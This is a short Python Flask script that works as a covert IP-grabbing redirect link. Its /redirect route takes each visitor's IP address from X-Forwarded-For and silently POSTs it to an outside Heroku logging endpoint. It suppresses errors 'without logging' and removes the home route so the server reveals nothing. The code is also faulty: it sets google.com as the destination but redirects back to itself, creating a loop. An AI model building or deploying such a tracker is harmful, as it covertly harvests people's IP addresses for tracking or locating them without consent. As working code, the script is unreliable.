from flask import Flask, request, redirect
import requests

app = Flask(__name__)

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    # Get the real client IP address from the X-Forwarded-For header.
    # This header can contain a list of IPs, with the first being the real client IP.
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Send the IP address to another server
    target_server_url = "https://powerful-castle-33891-b06c61e5b944.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": client_ip}

    try:
        # Send the IP as a POST request
        requests.post(target_server_url, json=payload)
    except Exception as e:
        # Silently handle exceptions without logging
        pass

    # Redirect the user to google.com
    target_url = "https://google.com"  # You can change this to any URL
    return redirect('./redirect')

# Remove the home route, so that accessing the root (/) doesn't return anything
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
